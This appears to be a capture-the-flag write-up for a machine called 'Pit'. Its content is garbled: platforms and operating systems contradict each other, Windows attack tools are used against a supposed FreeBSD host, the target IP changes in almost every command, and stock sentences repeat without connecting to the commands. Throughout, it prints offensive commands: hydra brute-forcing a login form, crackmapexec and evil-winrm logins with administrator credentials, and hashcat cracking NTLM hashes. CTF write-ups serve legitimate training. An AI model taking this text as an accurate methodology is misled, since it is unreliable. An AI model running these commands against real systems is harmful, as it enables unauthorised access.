---
TitleSEO: "VulnHub — Pit (Medium FreeBSD) | ZureFX"
TitlePost: "VulnHub — Pit (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Pit. SeDebugPrivilege and Pass the Hash to achieve medium compromise on FreeBSD."
Keywords: "pwntilldawn, ctf, linux"
URL: "https://zurefx.github.io/writeups/htb-pit-547.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-pit-547/"
Date: "2025-12-16"
Tags: "PwnTillDawn, CTF, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-pit-547"
Permalink: "/writeups/htb-pit-547.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Pit** is rated **Medium** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.58.54.125`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.128.22.105 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.26.130.191 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.80.22.7 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.71.162.81 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.59.80 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

Key finding: **Pass the Hash**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.79.157.166 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
evil-winrm -i 10.79.221.177 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.32.143.168 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.212.90 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.177.184 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `hashcat`
- `rubeus`
- `kerbrute`
- `lookupsid`

### Key Takeaways

- SeDebugPrivilege
- Pass the Hash
- DLL Hijacking
